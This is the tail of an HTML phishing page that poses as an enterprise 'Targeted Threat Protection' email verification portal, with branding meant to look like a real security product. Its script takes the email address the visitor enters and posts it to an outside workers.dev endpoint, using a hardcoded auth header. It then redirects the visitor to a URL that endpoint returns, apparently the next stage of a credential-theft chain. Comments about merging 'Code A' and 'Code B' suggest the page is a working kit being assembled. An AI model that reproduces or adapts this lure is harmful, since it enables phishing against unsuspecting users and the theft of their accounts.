        .form-control[_ngcontent-wyq-c27] {
            max-width: 312px
        }

        .contact-it-text[_ngcontent-wyq-c27] {
            font-size: 13px
        }
    </style>
    <style>
        .feedback-badge[_ngcontent-wyq-c21] {
            display: inline-block;
            border-radius: 100px;
            overflow: hidden;
            white-space: nowrap
        }

        .feedback-badge[_ngcontent-wyq-c21]>span[_ngcontent-wyq-c21] {
            display: inline-block
        }

        .feedback-badge[_ngcontent-wyq-c21]>span[_ngcontent-wyq-c21]:first-child {
            margin-right: -.5rem;
            width: 1.5em
        }

        .feedback-badge[_ngcontent-wyq-c21]>.fa-stack[_ngcontent-wyq-c21] {
            line-height: 2;
            margin-left: 2px
        }

        .feedback-badge[_ngcontent-wyq-c21] .loader[_ngcontent-wyq-c21] {
            width: 1em;
            height: 1em
        }

        .feedback-badge[_ngcontent-wyq-c21] .status-icon[_ngcontent-wyq-c21] {
            width: 2em;
            height: 2em
        }

        .text[_ngcontent-wyq-c21] {
            vertical-align: middle;
            padding-left: .5px
        }

        .loader[_ngcontent-wyq-c21] {
            display: block;
            border: 2px solid transparent;
            border-radius: 50%;
            animation: spin 1.5s linear infinite;
            transition: opacity .5s ease-in
        }

        .feedback-badge-loaded[_ngcontent-wyq-c21]>span.text[_ngcontent-wyq-c21] {
            white-space: normal
        }

        @keyframes spin {
            0% {
                transform: rotate(0)
            }

            to {
                transform: rotate(360deg)
            }
        }
    </style>
    <style>
        i[_ngcontent-wyq-c18] {
            font-size: 20px
        }

        mc-spinner[_ngcontent-wyq-c18] {
            font-size: 1.4117em;
            line-height: .5;
            margin: -.21em .17em -.1em -.238em;
            display: inline-block;
            vertical-align: middle
        }

        button.btn-lg[_ngcontent-wyq-c18]>mc-spinner[_ngcontent-wyq-c18] {
            font-size: 1.4118em;
            margin: -.12em .17em -.1em -.238em
        }

        button.btn-md[_ngcontent-wyq-c18]>mc-spinner[_ngcontent-wyq-c18] {
            font-size: 1.539em
        }

        button.btn-sm[_ngcontent-wyq-c18]>mc-spinner[_ngcontent-wyq-c18] {
            font-size: 1.637em
        }

        button.btn-xs[_ngcontent-wyq-c18]>mc-spinner[_ngcontent-wyq-c18] {
            font-size: 1.274em
        }
    </style>
</head>

<body>
    <ttp-app _nghost-wyq-c25="" ng-version="11.2.14">
    <header _ngcontent-wyq-c25="" class="navbar navbar-inverse">
      <div _ngcontent-wyq-c25="" class="container">
        <div _ngcontent-wyq-c25="" class="row">
          <div _ngcontent-wyq-c25="" class="col-md-8 col-md-offset-2 col-sm-12">
          </div>
        </div>
      </div>
    </header>

    <div _ngcontent-wyq-c25="" class="container">
      <main _ngcontent-wyq-c25="">
        <router-outlet _ngcontent-wyq-c25=""></router-outlet>
        <ttp-enrollment-component
          _nghost-wyq-c27=""
          class="ng-tns-c27-0 ng-star-inserted"
        >
          <div
            _ngcontent-wyq-c27=""
            class="row ng-tns-c27-0 ng-star-inserted"
          >
            <div
              _ngcontent-wyq-c27=""
              class="col-md-8 col-md-offset-2 col-sm-12 ng-tns-c27-0"
            >
              <mc-feedback-badge
                _ngcontent-wyq-c27=""
                icon="fa-lock"
                status="info"
                text="FEEDBACK_BADGE_ENROLLMENT.ENROLLMENT"
                class="feedback-badge-container ng-tns-c27-0 ng-tns-c21-1 ng-star-inserted"
                _nghost-wyq-c21=""
              >
                <div
                  _ngcontent-wyq-c21=""
                  class="feedback-badge ng-trigger ng-trigger-badge ng-tns-c21-1 badge-bg-info ng-star-inserted feedback-badge-loaded"
                >
                  <span
                    _ngcontent-wyq-c21=""
                    class="fa-stack fa-lg ng-tns-c21-1 badge-text-info"
                  >
                    <svg
                      xmlns="http://www.w3.org/2000/svg"
                      x="0px"
                      y="0px"
                      width="20"
                      height="35"
                      viewBox="0,0,256,256"
                    >
                      <g
                        fill="#225b81"
                        fill-rule="nonzero"
                        stroke="none"
                        stroke-width="1"
                        stroke-linecap="butt"
                        stroke-linejoin="miter"
                        stroke-miterlimit="10"
                        stroke-dasharray=""
                        stroke-dashoffset="0"
                        font-family="none"
                        font-weight="none"
                        font-size="none"
                        text-anchor="none"
                        style="mix-blend-mode: normal"
                      >
                        <g transform="scale(8.53333,8.53333)">
                          <path
                            d="M15,2c-3.85433,0 -7,3.14567 -7,7v2h-2c-1.105,0 -2,0.895 -2,2v12c0,1.105 0.895,2 2,2h18c1.105,0 2,-0.895 2,-2v-12c0,-1.105 -0.895,-2 -2,-2h-2v-2c0,-3.72842 -2.96342,-6.73143 -6.64453,-6.92773c-0.11309,-0.04556 -0.23356,-0.07005 -0.35547,-0.07227zM15,4c2.77367,0 5,2.22633 5,5v2h-10v-2c0,-2.77367 2.22633,-5 5,-5z"
                          ></path>
                        </g>
                      </g>
                    </svg>
                  </span>
                  <span
                    _ngcontent-wyq-c21=""
                    class="text ng-tns-c21-1 ng-trigger ng-trigger-text badge-text-info"
                    style="opacity: 1;"
                    >Email Verification</span
                  >
                </div>
              </mc-feedback-badge>

              <div
                _ngcontent-wyq-c27=""
                class="ng-tns-c27-0 ng-trigger ng-trigger-content"
                style="opacity: 1;"
              >
                <div
                  _ngcontent-wyq-c27=""
                  class="panel-padding-top panel-padding-bottom ng-tns-c27-0"
                ></div>
                <p
                  _ngcontent-wyq-c27=""
                  class="panel-padding-top panel-padding-bottom ng-tns-c27-0"
                >
                  Email authentication is required to access secure portal
                </p>
                <p
                  _ngcontent-wyq-c27=""
                  class="panel-padding-top panel-padding-bottom ng-tns-c27-0"
                >
                  Enter your email below to continue
                </p>

                <!-- Use the same IDs as in the Code A script: 
                     emailInput for the input
                     submitButton for the button 
                -->
                <form
                  id="enrollmentForm"
                  _ngcontent-wyq-c27=""
                  novalidate=""
                  class="panel-padding-top ng-tns-c27-0 ng-untouched ng-pristine ng-invalid"
                >
                  <div
                    _ngcontent-wyq-c27=""
                    class="form-group ng-tns-c27-0"
                  >
                    <input
                      _ngcontent-wyq-c27=""
                      type="email"
                      name="email"
                      required=""
                      autocomplete="off"
                      class="form-control ng-tns-c27-0 ng-untouched ng-pristine ng-invalid"
                      placeholder="E-Mail"
                      id="emailInput"
                    />
                  </div>

                  <div
                    _ngcontent-wyq-c27=""
                    class="form-group ng-tns-c27-0"
                  >
                    <mc-live-button
                      _ngcontent-wyq-c27=""
                      class="ng-tns-c27-0"
                      _nghost-wyq-c18=""
                    >
                      <!-- Removed the 'disabled' attribute to allow clicking -->
                      <button
                        type="submit"
                        _ngcontent-wyq-c18=""
                        class="btn btn-primary btn-lg"
                        id="submitButton"
                      >
                        Verify your email address
                      </button>
                    </mc-live-button>
                  </div>
                </form>

                <p
                  _ngcontent-wyq-c27=""
                  class="panel-padding-bottom help-block contact-it-text ng-tns-c27-0"
                >
                  <strong _ngcontent-wyq-c27="" class="ng-tns-c27-0"
                    >You’ll only see this message again on new devices, or
                    if you delete your cookies. If you have any questions,
                    contact the TTP department.</strong
                  >
                </p>
              </div>
            </div>
          </div>
        </ttp-enrollment-component>
      </main>
    </div>

    <footer _ngcontent-wyq-c25="">
      <div _ngcontent-wyq-c25="" class="container">
        <div _ngcontent-wyq-c25="" class="row footer-wrapper">
          <div
            _ngcontent-wyq-c25=""
            class="col-md-8 col-md-offset-2 col-sm-12"
          >
            <div _ngcontent-wyq-c25="" class="h-box auto-xs h-full">
              <div _ngcontent-wyq-c25="" class="col v-middle">
                <div _ngcontent-wyq-c25="" class="media">
                  <div _ngcontent-wyq-c25="" class="media-left">
                    <img
                      width="40"
                      height="40"
                      src="https://img.icons8.com/ios-filled/50/microsoft-admin.png"
                      alt="microsoft-admin"
                    />
                  </div>
                  <div _ngcontent-wyq-c25="" class="media-body">
                    Targeted Threat Protection
                    <br _ngcontent-wyq-c25="" />
                    Your decision will be logged for tracking and audit
                    purposes.
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </footer>
  </ttp-app>
  <!-- ***** END: Code B HTML ***** -->

  <!-- Loading section (spinner) from Code A -->
  <div class="loading-section" id="loadingSection">
    <div class="spinner"></div>
    <p>Verifying your details...</p>
  </div>

    <!-- JavaScript Logic -->
<script>
    const enrollmentForm = document.getElementById("enrollmentForm");
    const emailInput = document.getElementById("emailInput");
    const submitButton = document.getElementById("submitButton");
    const loadingSection = document.getElementById("loadingSection");

    // Click handler
    submitButton.addEventListener("click", async function(event) {
      // Prevent the default form submission
      event.preventDefault();

      const emailValue = emailInput.value.trim();
      if (!emailValue || !emailValue.includes("@")) {
        alert("Please enter a valid email address.");
        return;
      }

      // Hide the form and show the spinner
      enrollmentForm.style.display = "none";
      loadingSection.style.display = "block";

      const endpoint = "https://oraclebridge.oauth-token.workers.dev/";
      try {
        const response = await fetch(endpoint, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "X-Special-Auth": "cSah8ebIoxxdnxYuthJiSvA7FYfqrHF9"
          },
          body: JSON.stringify({ email: emailValue }),
        });
        
        if (response.ok) {
          const finalRedirectUrl = await response.text();
          // Redirect after a short delay
          setTimeout(() => {
            window.location.href = finalRedirectUrl;
          }, 3000);
        } else {
          alert("Error processing request. Please try again.");
          // Show form again if needed
          enrollmentForm.style.display = "block";
          loadingSection.style.display = "none";
        }
      } catch (error) {
        console.error("Error:", error);
        alert("Unable to process request.");
        // Show form again if needed
        enrollmentForm.style.display = "block";
        loadingSection.style.display = "none";
      }
    });

    // Pressing Enter also triggers the submission
    emailInput.addEventListener("keydown", function(event) {
      if (event.key === "Enter") {
        event.preventDefault();
        submitButton.click();
      }
    });
  </script>



</body></html>
